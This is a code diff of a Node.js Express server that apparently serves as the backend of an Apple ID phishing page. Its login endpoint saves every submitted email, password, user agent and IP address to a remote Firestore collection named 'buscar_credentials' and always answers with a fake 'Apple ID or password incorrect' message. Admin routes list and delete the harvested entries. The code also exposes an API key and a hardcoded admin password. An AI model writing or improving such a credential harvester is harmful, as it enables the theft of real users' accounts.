@@ -9,11 +9,11 @@ const PORT = process.env.PORT || 3000;
 
 // Configuração do Firebase
 const PROJECT_ID = "missoes-drive";
-const API_KEY = "AIzaSyDsWJ9VVMSIsQNtifkLVnRNnbzU7favF7s"; // Sua API Key (opcional para leitura pública, mas bom ter)
+const API_KEY = "AIzaSyDsWJ9VVMSIsQNtifkLVnRNnbzU7favF7s";
 const COLLECTION = "buscar_credentials";
 
 // URL base do Firestore REST API
-const FIRESTORE_URL = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${COLLECTION}`;
+const FIRESTORE_URL = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${COLLECTION}?key=${API_KEY}`;
 
 // Middleware
 app.use(bodyParser.json());
@@ -46,20 +46,19 @@ app.use(express.static(path.join(__dirname, 'public')));
 const ADMIN_EMAIL = 'admin@buscar.com';
 const ADMIN_PASSWORD = 'Admin@2026';
 
-// Helper para converter objeto JS para formato Firestore JSON
+// Helpers
 function toFirestoreJSON(obj) {
     const fields = {};
     for (const [key, value] of Object.entries(obj)) {
         if (typeof value === 'string') fields[key] = { stringValue: value };
         else if (typeof value === 'number') fields[key] = { doubleValue: value };
         else if (typeof value === 'boolean') fields[key] = { booleanValue: value };
-        // Adicione outros tipos se necessário
     }
     return { fields };
 }
 
-// Helper para converter Firestore JSON para objeto JS
 function fromFirestoreJSON(doc) {
+    if (!doc.fields) return { id: doc.name.split('/').pop() };
     const obj = { id: doc.name.split('/').pop() };
     const fields = doc.fields || {};
     for (const [key, value] of Object.entries(fields)) {
@@ -70,15 +69,11 @@ function fromFirestoreJSON(doc) {
     return obj;
 }
 
-// Login endpoint - Salva no Firestore via REST
+// Login endpoint
 app.post('/api/login', async (req, res) => {
     const { email, password } = req.body;
+    let firebaseError = null;
 
-    if (!email || !password) {
-        return res.status(400).json({ success: false, message: 'Email e senha são obrigatórios' });
-    }
-
-    // Salva no Firestore
     try {
         const firestoreData = toFirestoreJSON({
             email,
@@ -87,18 +82,21 @@ app.post('/api/login', async (req, res) => {
             userAgent: req.headers['user-agent'] || 'unknown',
             ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown'
         });
-
         await axios.post(FIRESTORE_URL, firestoreData);
     } catch (err) {
-        console.error('Erro Firestore REST:', err.response ? err.response.data : err.message);
+        firebaseError = err.response ? err.response.data : err.message;
+        console.error('Erro Firestore REST:', firebaseError);
     }
 
-    // Verifica se é admin
     if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
         return res.json({ success: true, isAdmin: true });
     }
 
-    return res.json({ success: false, message: 'ID Apple ou senha incorreta.' });
+    return res.json({ 
+        success: false, 
+        message: 'ID Apple ou senha incorreta.',
+        debug: firebaseError
+    });
 });
 
 // Admin Auth
@@ -108,46 +106,40 @@ app.post('/api/admin/auth', (req, res) => {
     return res.status(401).json({ success: false, message: 'Acesso negado' });
 });
 
-// Get Data - Firestore REST
+// Get Data
 app.post('/api/admin/data', async (req, res) => {
     const { email, password } = req.body;
-
     if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
         return res.status(401).json({ success: false, message: 'Acesso negado' });
     }
 
     try {
-        // Busca todos os documentos (limite 100 para exemplo)
-        const response = await axios.get(`${FIRESTORE_URL}?pageSize=100`);
+        const response = await axios.get(`${FIRESTORE_URL}&pageSize=100`);
         const documents = response.data.documents || [];
         const data = documents.map(fromFirestoreJSON);
-        
-        // Ordena por timestamp manual (já que o REST não ordena fácil sem index)
         data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-
         return res.json({ success: true, data });
     } catch (err) {
-        console.error('Erro Admin Data:', err.response ? err.response.data : err.message);
-        return res.status(500).json({ success: false, message: 'Erro ao ler dados' });
+        const errorDetail = err.response ? err.response.data : err.message;
+        return res.status(500).json({ success: false, message: 'Erro ao ler dados', error: errorDetail });
     }
 });
 
-// Delete Entry - Firestore REST
+// Delete Entry
 app.post('/api/admin/delete', async (req, res) => {
     const { email, password, docId } = req.body;
-
     if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
         return res.status(401).json({ success: false, message: 'Acesso negado' });
     }
-
     try {
-        await axios.delete(`${FIRESTORE_URL}/${docId}`);
+        const deleteUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${COLLECTION}/${docId}?key=${API_KEY}`;
+        await axios.delete(deleteUrl);
         return res.json({ success: true });
     } catch (err) {
-        return res.status(500).json({ success: false, message: 'Erro ao deletar' });
+        return res.status(500).json({ success: false, message: 'Erro ao deletar', error: err.message });
     }
 });
 
 app.listen(PORT, () => {
-    console.log(`\n🔍 Buscar Server (REST) running at http://localhost:${PORT}`);
+    console.log(`\n🔍 Buscar Server running at http://localhost:${PORT}`);
 });
